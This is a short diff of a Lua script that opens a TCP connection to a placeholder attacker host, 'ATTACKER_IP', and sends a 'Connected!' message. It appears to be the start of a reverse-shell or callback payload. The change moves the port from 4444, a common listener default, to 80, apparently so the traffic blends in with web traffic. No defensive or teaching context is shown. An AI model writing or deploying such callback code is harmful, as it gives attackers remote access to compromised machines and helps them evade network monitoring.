@@ -1,5 +1,5 @@
 local socket = require("socket")
-local host, port = "ATTACKER_IP", 4444
+local host, port = "ATTACKER_IP", 80
 local tcp = assert(socket.tcp())
 tcp:connect(host, port)
 tcp:send("Connected!\n")
